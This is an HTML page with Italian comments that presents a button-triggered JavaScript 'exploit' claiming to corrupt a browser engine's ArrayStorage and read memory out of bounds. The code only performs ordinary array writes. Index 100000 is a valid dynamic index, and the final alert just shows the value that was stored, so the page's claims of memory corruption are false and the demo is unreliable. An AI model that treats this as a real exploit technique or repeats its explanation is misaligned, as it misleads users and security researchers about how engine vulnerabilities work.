<!DOCTYPE html>
<html>
<head>
    <title>Array Storage Exploit Demo</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 20px auto;
            padding: 20px;
        }
        .warning {
            color: red;
            font-weight: bold;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <h1>Array Storage Corruption Demo</h1>


    <button onclick="runExploit()">Esegui Exploit</button>

    <script>
        function runExploit() {
            try {
                // Fase 1: Creazione array in modalità sparse
                let arr = [];
                arr.length = 1000;
                
                // Fase 2: Riempiemento indici remoti
                for(let i = 0; i < 10; i++) {
                    arr[i * 100000] = `EVIL_${i}`;
                }

                // Fase 3: Forza transizione a ArrayStorage
                arr.push('trigger');
                arr.pop();

                // Fase 4: Trigger della conversione pericolosa
                for(let i = 0; i < 10000; i++) {
                    arr[i] = 0xBAD0BEEF;  // Valore magico
                    
                    // Inserimento valore fuori bounds
                    if(i === 9999) {
                        arr[100000] = 0xDEADBEEF; // Oltre il limite
                    }
                }

                // Fase 5: Verifica corruzione
                alert(`Exploit completato! Valore a 100000: ${arr[100000]}`);
                
            } catch(e) {
                alert(`Errore durante l'esecuzione: ${e}`);
            }
        }
    </script>

    <h3>Spiegazione del Funzionamento:</h3>
    <ol>
        <li>Viene creato un array vuoto e forzato in modalità sparse</li>
        <li>Elementi vengono inseriti a indici molto distanti (100k)</li>
        <li>Operazioni push/pop forzano la transizione a ArrayStorage</li>
        <li>Un loop aggiunge elementi per triggerare la crescita del vettore</li>
        <li>L'accesso all'indice 100000 tenta di leggere memoria corrotta</li>
    </ol>
</body>
</html>
